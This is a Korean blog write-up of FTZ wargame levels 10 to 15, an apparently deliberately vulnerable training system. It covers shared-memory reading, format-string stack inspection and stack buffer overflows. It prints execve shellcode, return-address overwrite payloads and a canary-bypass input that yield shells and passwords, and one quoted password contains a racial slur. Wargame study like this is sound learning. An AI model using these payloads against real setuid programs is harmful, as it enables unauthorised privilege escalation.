---
layout: article
title: "[System]System hacking(2)"
key: 19700101
tags:
  - Pwnable
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] System Hacking(10~20)

<!--more-->

## [+] FTZ level10

### Analysis

공유 메모리에 관한 문제라고 한다.
공유 메모리 여러 개의 프로세스가 함께 사용하는 메모리를 의미한다. 이 공유 메모리를 이용해 프로세스 간 통신이 가능하다. 참고로 프로세스 간 통신(IPC)를 이용하는 방법으로는 공유 메모리 외에 메시지 큐, 세마포어가 존재한다.

공유 메모리는 최초로 공유 메모리를 생성하는 프로세스에 의해서 생성되며 커널에서 관리하게 된다. 또한 한번 만들어진 메모리 공간은 프로세스가 사용하지 않는다고 사라지지 않고 직접 삭제 또는 리부팅 시에만 사라진다

공유 메모리가 사용되는 것을 확인하는 명령어는 `ipcs` 명령어이다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024

int main()
{
        void *shM=(void *)0;
        int shMID;
        char buf[BUFFSIZE]="3456";
        key_t keyval =7777;

        shMID=shmget(keyval,BUFFSIZE,IPC_CREAT);
        printf("%d\n",shMID);
        shM=shmat(shMID,(void*)0,0);
        if(shM==(void*)-1)
                printf("Error!!\n");
        else
                memcpy(shM,buf,BUFFSIZE);
                printf("%s\n",shM);
        shmdt(shM); 
         
        return 0;
}
```

`shmget()` 함수를 이용해 공유 메모리를 생성하여 공유된 메모리의 ID 값을 반환하여 `shMID` 변수에 할당한다. `shmat()` 함수를 이용해 `shM` 변수에 메모리를 할당한다. `malloc` 함수와 유사하다.

그리고 `shmdt()`함수를 이용해 공유 메모리와 분리하고 종료한다.


```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define shmKey 7530
#define BUFFSIZE 1024

int main()
{
        int shMID;
        char buf[BUFFSIZE];
        void *shM;
        shMID=shmget(shmKey,BUFFSIZE,IPC_CREAT);
        if(shMID==-1){
                printf("Error shmget()\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if((void *)-1==shM){
                printf("Error shmat()\n");
                exit(0);
        }
    	memcpy(buf,shM,BUFFSIZE);
    	printf("%s\n",buf);
        //printf("%s\n",(char *)shM);
        shmdt(shM);
        return 0;
}
```

위와 같이 짜서 실행하면 패스워드가 출력된다.

공유 메모리 원리에 대해 좀더 알아보자

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmkey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE]="3456";

        shMID=shmget(shmkey,BUFFSIZE,IPC_CREAT|0666);
        shM=shmat(shMID,(void *)0,0);

        memcpy(shM,buf,BUFFSIZE);
        printf("%s\n",shM);

        shmdt(shM);
        return 0;
}
```

위는 공유 메모리를 생성하는 코드이다. 이제 저 프로그램을 공격하는 코드를 짜본다.

```c
#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024
#define shmKey 7777

int main()
{
        void *shM;
        int shMID;
        char buf[BUFFSIZE];

        shMID=shmget(shmKey,BUFFSIZE,0666);
        if(shMID==-1){
                printf("Error shmget()!\n");
                exit(0);
        }
        shM=shmat(shMID,(void *)0,0);
        if(shM==(void *)-1){
                printf("Error shmat()!\n");
                exit();
        }
        memcpy(buf,shM,BUFFSIZE);
        if(strcmp(buf,"3456")==0)
                printf("key is %s\n",buf);
        else
                printf("invalid password\n");
        shmdt(shM);
        return 0;
}
```

```
[level10@ftz tmp]$ ./shm2
key is 3456
```

컴파일하여 실행하면 위와 같이 공유 메모리에 존재하는 문자열을 가져오는 것을 확인할 수 있다.



## [+] FTZ level11

### Analysis

먼저 간단한 포맷 스트링을 알아보자아

| 식별자 |  인수  |         출력         |
| :----: | :----: | :------------------: |
|   %x   |  int   |   부호 없는 16진수   |
|   %d   |  int   |   부호 있는 10진수   |
|   %o   |  int   |   부호 없는 8진수    |
|   %c   |  char  |         문자         |
|   %s   | char * |        문자열        |
|   %f   | double |         소수         |
|   %p   | void * | 변수의 주소1(16진수) |

포맷스트링에서 어떠한 취약점이 발생하는지 알아보기 위해 아래와 같은 소스를 이용한다.

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
        int value=10;
        char *hacker="hacker";
        char *super="Super";

        printf(argv[1]);
        printf("\n");
}
```

컴파일 시 `gcc -mpreferred-stack-boundary=2 <c source file>` 으로 옵션을 추가해 더미를 제거한다.

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048328 <main+0>:	push   %ebp
0x08048329 <main+1>:	mov    %esp,%ebp
0x0804832b <main+3>:	sub    $0xc,%esp
0x0804832e <main+6>:	movl   $0xa,0xfffffffc(%ebp)
0x08048335 <main+13>:	movl   $0x8048410,0xfffffff8(%ebp)
0x0804833c <main+20>:	movl   $0x8048417,0xfffffff4(%ebp)
0x08048343 <main+27>:	mov    0xc(%ebp),%eax
0x08048346 <main+30>:	add    $0x4,%eax
0x08048349 <main+33>:	pushl  (%eax)
0x0804834b <main+35>:	call   0x8048268 <printf>
0x08048350 <main+40>:	add    $0x4,%esp
0x08048353 <main+43>:	push   $0x804841d
0x08048358 <main+48>:	call   0x8048268 <printf>
0x0804835d <main+53>:	add    $0x4,%esp
0x08048360 <main+56>:	leave  
0x08048361 <main+57>:	ret    
0x08048362 <main+58>:	nop    
0x08048363 <main+59>:	nop    
End of assembler dump.
```

해당 디스어셈블 코드이다. 자 포맷스트링을 통해 일어나는 취약점을 확인해본다.

`printf(argv[1])` 으로 실행 시 전달받은 인자를 출력하게 되는데 포맷스트링을 사용하지 않고 이런식의 코딩은 매우 위험하다.

```bash
Starting program: /home/level11/tmp/a.out "%8x %8x %8x %8x %8x %8x %8x %8x"

Breakpoint 1, 0x0804834b in main ()
(gdb) x/9x $esp
0xbffff6a8:	0xbffffc19	0x08048417	0x08048410	0x0000000a
0xbffff6b8:	0xbffff6d8	0x42015574	0x00000002	0xbffff704
0xbffff6c8:	0xbffff710
(gdb) x/s 0xbffffc19
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/s 0x8048417
0x8048417 <_IO_stdin_used+11>:	 "Super"
(gdb) x/s 0x8048410
0x8048410 <_IO_stdin_used+4>:	 "hacker"
(gdb) x/d 0xbffff6b4
0xbffff6b4:	10
(gdb) x/x 0xbffff6d8 
0xbffff6d8:	0x00000000
(gdb) x/x 0x42015574
0x42015574 <__libc_start_main+228>:	0x58ebc189
(gdb) x/d 0xbffff6c0
0xbffff6c0:	2
(gdb) x/x 0xbffff704 
0xbffff704:	0xbffffc01
(gdb) x/2s 0xbffffc01
0xbffffc01:	 "/home/level11/tmp/a.out"
0xbffffc19:	 "%8x %8x %8x %8x %8x %8x %8x %8x"
(gdb) x/x 0xbffff710
0xbffff710:	0xbffffc39
(gdb) x/16s 0xbffffc39
0xbffffc39:	 "HOSTNAME=ftz.hackerschool.org"
0xbffffc57:	 "SHELL=/bin/bash"
0xbffffc67:	 "TERM=xterm"
0xbffffc72:	 "HISTSIZE=1000"
0xbffffc80:	 "SSH_CLIENT=192.168.64.1 2346 22"
0xbffffca0:	 "SSH_TTY=/dev/pts/0"
0xbffffcb3:	 "USER=level11"
0xbffffcc0:	 "LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=00;32:*.cmd=00;32:*.exe=00;32:*.com=00;32:*.btm=00;32:*.bat=00;32:*.sh=00;32:*.csh=00"...
0xbffffd88:	 ";32:*.tar=00;31:*.tgz=00;31:*.arj=00;31:*.taz=00;31:*.lzh=00;31:*.zip=00;31:*.z=00;31:*.Z=00;31:*.gz=00;31:*.bz2=00;31:*.bz=00;31:*.tz=00;31:*.rpm=00;31:*.cpio=00;31:*.jpg=00;35:*.gif=00;35:*.bmp=00;3"...
0xbffffe50:	 "5:*.xbm=00;35:*.xpm=00;35:*.png=00;35:*.tif=00;35:"
0xbffffe83:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level11/bin"
0xbffffec6:	 "MAIL=/var/spool/mail/level11"
0xbffffee3:	 "PWD=/home/level11/tmp"
0xbffffef9:	 "INPUTRC=/etc/inputrc"
0xbfffff0e:	 "LANG=en_US.UTF-8"
0xbfffff1f:	 "PS1=[\\u@\\h \\W]$ "
(gdb) 
```

자세히 잘봐야한다; 

| *super(0xbffff6ac) | *hacker(0xbffff6b0) | int a(0xbffff6b4) | SFP  | RET(0xbffff6bc) | argc | argv | env      |
| :----------------: | ------------------- | ----------------- | ---- | --------------- | ---- | ---- | -------- |
|     0x08048417     | 0x08048410          | 0x0000000a        |      | 0x42015574      | 2    | 명령 | 환경변수 |

이런 식으로 스택이 구성되있다.
`$esp` 내 존재하는 `%8x %8x %8x ...` 의 경우는 `printf` 함수 호출 전 푸시되어 있는 것이다.

그럼 잘 생각해보면 `*super-4` 만큼에 `printf` 인자를 전달하고 해당 주소에서 -4만큼 가면  복귀주소가 존재할 것이다.

요롷게 스택은 확인을하고.. 바로 해당 레벨 풀이를 해본다.



```bash
[level11@ftz level11]$ gdb ./attackme -q
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   %ebp
0x08048471 <main+1>:	mov    %esp,%ebp
0x08048473 <main+3>:	sub    $0x108,%esp
0x08048479 <main+9>:	sub    $0x8,%esp
0x0804847c <main+12>:	push   $0xc14
0x08048481 <main+17>:	push   $0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    $0x10,%esp
0x0804848e <main+30>:	sub    $0x8,%esp
0x08048491 <main+33>:	mov    0xc(%ebp),%eax
0x08048494 <main+36>:	add    $0x4,%eax
0x08048497 <main+39>:	pushl  (%eax)
0x08048499 <main+41>:	lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:	push   %eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
0x080484a5 <main+53>:	add    $0x10,%esp
0x080484a8 <main+56>:	sub    $0xc,%esp
0x080484ab <main+59>:	lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:	push   %eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    $0x10,%esp
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
(gdb)
```

위에서 예시를 이용해 스택을 확인한 것 처럼 문제 역시 동일하게 한번 확인한다. 





후 19/01/02 다시 시작

포맷스트링이고 나발이고 책에 너무 정신없이 나와있어서 그냥 bof로 풀었다.
setuid가 걸린 상태에서 gdb가 제대로 동작하지 않아 tmp 디렉토리로 옮긴 후 작업을 하였다.
환경변수에 쉘코드를 넣어두고 해당 환경변수의 주소 값을 이용하여 공격에 성공할 수 있다.

본론부터 보면 strcpy 함수에서 버퍼오버플로우 취약점이 발생한다. 이유는 버퍼에 문자열을 옮길 때 길이에 대한 검증을 하지 않기 때문이다.

```assembly
[level11@ftz tmp]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   %ebp
0x08048471 <main+1>:	mov    %esp,%ebp
0x08048473 <main+3>:	sub    $0x108,%esp
0x08048479 <main+9>:	sub    $0x8,%esp
0x0804847c <main+12>:	push   $0xc14
0x08048481 <main+17>:	push   $0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    $0x10,%esp
0x0804848e <main+30>:	sub    $0x8,%esp
0x08048491 <main+33>:	mov    0xc(%ebp),%eax
0x08048494 <main+36>:	add    $0x4,%eax
0x08048497 <main+39>:	pushl  (%eax)
0x08048499 <main+41>:	lea    0xfffffef8(%ebp),%eax
0x0804849f <main+47>:	push   %eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>	; 취약함수
0x080484a5 <main+53>:	add    $0x10,%esp
0x080484a8 <main+56>:	sub    $0xc,%esp
0x080484ab <main+59>:	lea    0xfffffef8(%ebp),%eax
0x080484b1 <main+65>:	push   %eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    $0x10,%esp
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
```

때문에 취약한 함수가 실행되고 난 후, `0x80484a5`에 bp를 걸고 진행하면 되겠다.
스택 계산을 하면, `main`함수에서 초기 스택 할당 시, `0x108(264)`만큼 할당하는 것을 확인할 수 있다.(`main+3`)

기존 알고있는 스택 구조 상, `| 264 byte(char[256]) | 4 byte(SFP) | 4 byte(RET) |` 임을 알 수 있다.
그럼 우린 여기서 RET의 주소를 환경변수 내 쉘 코드가 존재하는 주소의 값으로 변조하면 된다.

다음과 같이 gdb에서 버퍼오버플로우를 이용하여 스택을 살펴본다.

```assembly
(gdb) b *main+53
Breakpoint 1 at 0x80484a5
(gdb) r `python -c 'print "A"*256'`
Starting program: /home/level11/tmp/attackme `python -c 'print "A"*256'`

Breakpoint 1, 0x080484a5 in main ()
(gdb) x/128x $esp
0xbfffe590:	0xbfffe5a0	0xbffffb01	0xbfffe5c0	0x00000001
0xbfffe5a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe610:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe630:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x4200af00	0x42130a14	0xbfffe6c8	0x42015574	; dummy 8byte, sfp, ret
0xbfffe6b0:	0x00000002	0xbfffe6f4	0xbfffe700	0x4001582c	; argc, argv, env ...


(gdb) x/x 0xbfffe6f4	;argv
0xbfffe6f4:	0xbffffae6
(gdb) x/2s 0xbffffae6
0xbffffae6:	 "/home/level11/tmp/attackme"
0xbffffb01:	 'A' <repeats 200 times>...

(gdb) x/x 0xbfffe700	; env
0xbfffe700:	0xbffffc02
(gdb) x/24s 0xbffffc02
0xbffffc02:	 "HOSTNAME=ftz.hackerschool.org"
0xbffffc20:	 "SHELLCODE=101̜200\211211󿿱0F̜2001󿿐h//shh/bin\211⏓\211󿲒°\v̜200"	;환경변수 내 쉘코드
0xbffffc54:	 "SHELL=/bin/bash"
0xbffffc64:	 "TERM=xterm"
0xbffffc6f:	 "HISTSIZE=1000"
0xbffffc7d:	 "SSH_CLIENT=192.168.64.1 1895 22"
0xbffffc9d:	 "SSH_TTY=/dev/pts/2"
0xbffffcb0:	 "USER=level11"
0xbffffcbd:	 "LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=00;32:*.cmd=00;32:*.exe=00;32:*.com=00;32:*.btm=00;32:*.bat=00;32:*.sh=00;32:*.csh=00"...
0xbffffd85:	 ";32:*.tar=00;31:*.tgz=00;31:*.arj=00;31:*.taz=00;31:*.lzh=00;31:*.zip=00;31:*.z=00;31:*.Z=00;31:*.gz=00;31:*.bz2=00;31:*.bz=00;31:*.tz=00;31:*.rpm=00;31:*.cpio=00;31:*.jpg=00;35:*.gif=00;35:*.bmp=00;3"...
0xbffffe4d:	 "5:*.xbm=00;35:*.xpm=00;35:*.png=00;35:*.tif=00;35:"
0xbffffe80:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level11/bin"
0xbffffec3:	 "MAIL=/var/spool/mail/level11"
0xbffffee0:	 "PWD=/home/level11/tmp"
0xbffffef6:	 "INPUTRC=/etc/inputrc"
0xbfffff0b:	 "LANG=en_US.UTF-8"
0xbfffff1c:	 "PS1=[\\u@\\h \\W]$ "
0xbfffff2d:	 "HOME=/home/level11"
0xbfffff40:	 "SHLVL=1"
0xbfffff48:	 "BASH_ENV=/home/level11/.bashrc"
0xbfffff67:	 "LOGNAME=level11"
0xbfffff77:	 "SSH_CONNECTION=192.168.64.1 1895 192.168.64.131 22"
0xbfffffaa:	 "LESSOPEN=|/usr/bin/lesspipe.sh %s"
0xbfffffcc:	 "G_BROKEN_FILENAMES=1"

```

자 보면 아까 만들어놓은 쉘코드가 환경변수에 잘 들어가있다. 지금 현재는 정상적인 스택의 상태이다.
계산을 해보면 증명이된다. 정상적으로 256바이트의 모든 배열을 사용하였다고 했을 때, 12 byte(dummy + sfp) 뒤에 ret가 있다.  그럼 256+12 = 268 바이트만큼 의미없는 값으로 채워주고 쉘코드가 있는 환경변수의 주소 값을 넣어주면 된다.

```sh
[level11@ftz tmp]$ ./env
Shell ADDR: 0xbffffc22 # 쉘 코드 주소

[level11@ftz level11]$ ./attackme `python -c 'print "A"*268+"\x22\xfc\xff\xbf"'` #RET 주소 변조
sh-2.05b$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05b$ my-pass
TERM environment variable not set.

Level12 Password is "it is like this".
```

끝!



## [+] FTZ level12 ~ level13

### Analysis

level 12의 경우 11과 같은 방식의 버퍼오버플로우를 이용하여 풀 수 있다.
level 13의 경우 소스 코드를 보면 다음과 같다.

```c
#include <stdlib.h> 

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}
```

`buf` 에 1024 바이트만큼 할당을하고, i에는 `0x1234567` 값을 저장하는 것을 볼 수 있다. 마찬가지로 strcpy 함수를 통해 `argv` 값을 `buf`에 복사한다.

무엇인가 하니 스택가드의 기초적인 문제이다. `gdb`를 통해 스택을 살펴보자.

```sh
[level13@ftz level13]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x080484a0 <main+0>:	push   %ebp
0x080484a1 <main+1>:	mov    %esp,%ebp
0x080484a3 <main+3>:	sub    $0x418,%esp	; 1048 byte
0x080484a9 <main+9>:	movl   $0x1234567,0xfffffff4(%ebp)
0x080484b0 <main+16>:	sub    $0x8,%esp
0x080484b3 <main+19>:	push   $0xc16
0x080484b8 <main+24>:	push   $0xc16
0x080484bd <main+29>:	call   0x8048370 <setreuid>
0x080484c2 <main+34>:	add    $0x10,%esp
0x080484c5 <main+37>:	cmpl   $0x1,0x8(%ebp)
0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
0x080484cb <main+43>:	sub    $0x8,%esp
0x080484ce <main+46>:	mov    0xc(%ebp),%eax
0x080484d1 <main+49>:	add    $0x4,%eax
0x080484d4 <main+52>:	pushl  (%eax)
0x080484d6 <main+54>:	lea    0xfffffbe8(%ebp),%eax
0x080484dc <main+60>:	push   %eax
0x080484dd <main+61>:	call   0x8048390 <strcpy>
0x080484e2 <main+66>:	add    $0x10,%esp
0x080484e5 <main+69>:	cmpl   $0x1234567,0xfffffff4(%ebp)	; breakpoint
0x080484ec <main+76>:	je     0x804850d <main+109>
0x080484ee <main+78>:	sub    $0xc,%esp
0x080484f1 <main+81>:	push   $0x80485a0
0x080484f6 <main+86>:	call   0x8048360 <printf>
0x080484fb <main+91>:	add    $0x10,%esp
0x080484fe <main+94>:	sub    $0x8,%esp
0x08048501 <main+97>:	push   $0xb
0x08048503 <main+99>:	push   $0x0
0x08048505 <main+101>:	call   0x8048380 <kill>
0x0804850a <main+106>:	add    $0x10,%esp
0x0804850d <main+109>:	leave  
0x0804850e <main+110>:	ret    
0x0804850f <main+111>:	nop    
End of assembler dump.
```

함수의 프롤로그 부분을 보면 1048 바이트만큼 할당하는 것을 볼 수 있다.
`| 1024 byte(char buf[1024]) | 4 byte (long i=0x01234567) | 20 byte(DUMMY) | SFP | RET |`

위와 같이 스택이 구성되어있을거라 예상된다.  책에서는 다음과 같이 스택의 구성을 설명했다.

`| 1024 byte(char buf[1024]) | 12 byte(DUMMY) | 4 byte (long i=0x01234567) | 8 byte(DUMMY) | SFP | RET |`

실제 값을 채워넣어보면 책이 맞다는걸 알 수 있다. 내가 예상한 스택의 구성대로 생각하여 버퍼오버플로우를 유도할 경우 1024 바이트에서 세그멘테이션 에러가 나야한다. 하지만 나지 않는다. 실제 1036 바이트만큼 채울 경우 오류가 발생한다. 현재는 64bit가 보편화되어 자료형 `long`의 경우 8byte로 아는 경우가 많지만 32bit 프로그램의 경우 4byte만큼 할당한다.

```sh
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1024'`
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036'`
 Warnning: Buffer Overflow !!! 
Segmentation fault
```

위와 같이 버퍼를 덮어씌우려 하면 버퍼오버플로우라는 오류 메시지가 출력되며 종료되는 것을 확인할 수 있다. 이렇게 정적으로 스택가드가 존재하는 경우에는 다음과 같이 우회가 가능하다.

먼저 환경변수에 쉘코드를 저장한다.

```sh
[level13@ftz level13]$ export SHELLCODE=`python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

[level13@ftz level13]$ echo 'int main() {printf("addr->%p\n",getenv("SHELLCODE"));}' > env.c
[level13@ftz tmp]$ ./a.out 
addr->0xbffffc1d # 쉘코드의 주소
```

다음은 다음과 같은 코드를 이용해 실행하면 쉘을 획득할 수 있다.

```sh
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\x1d\xfc\xff\xbf"'`
sh-2.05b$ id
uid=3094(level14) gid=3093(level13) groups=3093(level13)
sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "what that nigga want?".
```

`A` 문자를 1036바이트만큼 채운 뒤, 스택가드 값인 `0x01234567`을 채워주고 다음 `RET` 전까지 `A`로 덮어씌우고 쉘 코드가 있는 환경변수의 주소 값 `0xbffffc1d`를 `RET` 에 덮어씌워준다.

그러면 위와 같이 다음 레벨의 쉘을 획득 가능한 것을 확인할 수 있다.

끝!

## [+] FTZ level14

### Analysis

먼저 더미코드의 크기를 찾는 방법에 대해 책에 나와있어서 써본다.

```c
#include <stdio.h>
#include <unistd.h>

int main()
{
	int crap;
	int check;
	char buf[20];
	fgets(buf,45,stdin);

	if(check==0xdeadbeef)
	{
		setreuid(3095,3095);
		system("/bin/sh");
	}
	printf("Input : %s\n &buf : %p\n &check : %p\n &crap : %p\n",buf,buf,&check,&crap);
}
```

실제 문제와 같은 코드에 아래와 같이 `printf`함수를 이용해 해당 변수의 시작 주소 값을 출력한다.

```sh
[level14@ftz tmp]$ ./dummy 
a
Input : a

 &buf : 0xbfffe220
 &check : 0xbfffe248
 &crap : 0xbfffe24c
[level14@ftz tmp]$
```

`buf` 변수는 총 20 byte를 할당하였으나 해당 변수 다음인 `check` 변수의 크기 차이를 확인하면 `0x28` 만큼 차이나는 것을 확인할 수 있다. `check`와 `crap`은 4 byte 차이로 더미가 존재하지 않는다. 

```assembly
[level14@ftz tmp]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x08048490 <main+0>:	push   %ebp
0x08048491 <main+1>:	mov    %esp,%ebp
0x08048493 <main+3>:	sub    $0x38,%esp	; 56 바이트
```

실제 디버깅을 하면 위와 같이 56 byte 만큼 할당 된 것을 볼 수 있다.

`| 20 byte(buf) | 20 byte(DUMMY) | 4 byte(check) | 4 byte(crap) | 8 byte(DUMMY) |` 으로 확인 된다.

이제 이를 이용해 문제를 풀어본다.

```sh
[level14@ftz level14]$ cat hint

레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다.
버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이
최고의 효과를 가져다줍니다.

#include <stdio.h>
#include <unistd.h>
 
main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
```

위의 로직을 확인하면 `check` 변수에 `0xdeadbeef` 값이 존재하면 `level15` 계정의 권한으로 쉘을 실행한다.
먼저 실제 위에서 확인한 스택의 구조가 맞는지 gdb를 이용해 확인한다.

```sh
[level14@ftz tmp]$ gdb -q attackme 
(gdb) disass main
Dump of assembler code for function main:
0x08048490 <main+0>:	push   %ebp
0x08048491 <main+1>:	mov    %esp,%ebp
0x08048493 <main+3>:	sub    $0x38,%esp
0x08048496 <main+6>:	sub    $0x4,%esp
0x08048499 <main+9>:	pushl  0x8049664
0x0804849f <main+15>:	push   $0x2d
0x080484a1 <main+17>:	lea    0xffffffc8(%ebp),%eax
0x080484a4 <main+20>:	push   %eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
0x080484aa <main+26>:	add    $0x10,%esp
0x080484ad <main+29>:	cmpl   $0xdeadbeef,0xfffffff0(%ebp)	; "check" 변수 비교문에 브레이크 포인트
0x080484b4 <main+36>:	jne    0x80484db <main+75>
0x080484b6 <main+38>:	sub    $0x8,%esp
0x080484b9 <main+41>:	push   $0xc17
0x080484be <main+46>:	push   $0xc17
0x080484c3 <main+51>:	call   0x8048380 <setreuid>
0x080484c8 <main+56>:	add    $0x10,%esp
0x080484cb <main+59>:	sub    $0xc,%esp
0x080484ce <main+62>:	push   $0x8048548
0x080484d3 <main+67>:	call   0x8048340 <system>
0x080484d8 <main+72>:	add    $0x10,%esp
0x080484db <main+75>:	leave  
0x080484dc <main+76>:	ret    
0x080484dd <main+77>:	lea    0x0(%esi),%esi
End of assembler dump.
(gdb) b *main+29
Breakpoint 1 at 0x80484ad
(gdb) r
Starting program: /home/level14/tmp/attackme 
AAAA

Breakpoint 1, 0x080484ad in main ()
```

자 이제 스택을 확인한다.

```sh
(gdb) x/20x $esp
0xbfffec20:	0x41414141	0x4213000a	0xbfffec48	0x08048471
0xbfffec30:	0x08049560	0x08049668	0x4001582c	0x080483be
0xbfffec40:	0x08048308	0x42130a14	0xbfffec58	0x0804831e
0xbfffec50:	0x4200af84	0x42130a14	0xbfffec78	0x42015574
0xbfffec60:	0x00000001	0xbfffeca4	0xbfffecac	0x4001582c
```

이제 스택을 보면 현재 `0xbfffec60`에 있는 `0x1`은 argc 라는 것을 알 수 있다. 장족의 발전이라 믿는돠
스택을 계산하면 `RET(0xbfffec5c)` 까지 SFP를 제외하고 56 byte 인 것을 확인할 수 있다.

실제 쉘을 획득하기 위해 다음과 같이 실행하면 스택가드 기능을 하는 조건문을 우회하여 획득이 가능하다.

```sh
[level14@ftz level14]$ (python -c 'print "A"*40+"\xef\xbe\xad\xde"';cat)|/home/level14/attackme
whoami
level15
my-pass

Level15 Password is "guess what".
```

짠



## [+] FTZ level15

### Analysis

```c
#include <stdio.h>
 
main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}  
```

힌트를 살펴보면 위와 level14 와 별로 다를게 없다. 다른게 있다면 `check` 변수가 정수 자료형이 아닌 포인터 형이라는 것이다. 

level14와 마찬가지로 dummy 의 크기를 계산하여 스택이 어떻게 구성되어 있는지 확인한다.

```sh
[level15@ftz tmp]$ ./dummy 
AAAA
buf : bffff1a0
check : bffff1c8 # 40 byte 
crap : bffff1cc # 4byte
```

```sh
[level15@ftz tmp]$ gdb -q attackme 
(gdb) b *main+32
Breakpoint 1 at 0x80484b0
(gdb) r 
Starting program: /home/level15/tmp/attackme 
AAAA

Breakpoint 1, 0x080484b0 in main ()
(gdb) x/32x $esp
0xbfffee20:	0x41414141	0x4213000a	0xbfffee48	0x08048471
0xbfffee30:	0x08049560	0x08049668	0x4001582c	0x080483be
0xbfffee40:	0x08048308	0x42130a14	0xbfffee58	0x0804831e
0xbfffee50:	0x4200af84	0x42130a14	0xbfffee78	0x42015574	; ret
```

자 확인하면 `buf`에서 `check` 변수까지의 거리는 40byte 이다. 

`|char buf[20] (20byte) |DUMMY (20byte) |int *check (4byte) |int crap (4byte) |DUMMY (8byte) | SFT | RET | `

위와 같은 형태의 스택이 구성되는 것을 볼 수 있다. level14와 같은 스택이다.
여기서 다른점은 바로 `check` 변수가 포인터형이라는 것이다. 저 4byte에는 참조되는 주소 값이 존재하고 해당 주소 값에는 정수형 데이터가 존재하는 것이므로.... 

문제의 핵심은 `0xdeadbeef`라는 값을 `check` 가 참조하는 주소에 존재하도록 해야 하는 것이다.
그렇다면 `0xdeadbeef` 라는 값을 어디서 가져오거나 입력해서 넣고 그 주소를 찾아야한다. 그런데 우습게도 저 값은 이미 저장되어있다.

```sh
0x080484b0 <main+32>:	cmpl   $0xdeadbeef,(%eax)
```

디버깅을 통해 위와 같이 `main+32` 위치를 보면 비교문으로 `0xdeadbeef` 값이 존재하는 것을 알 수 있다.

```sh
(gdb) x/4x 0x80484b0
0x80484b0 <main+32>:	0xbeef3881	0x2575dead	0x6808ec83	0x00000c18
```

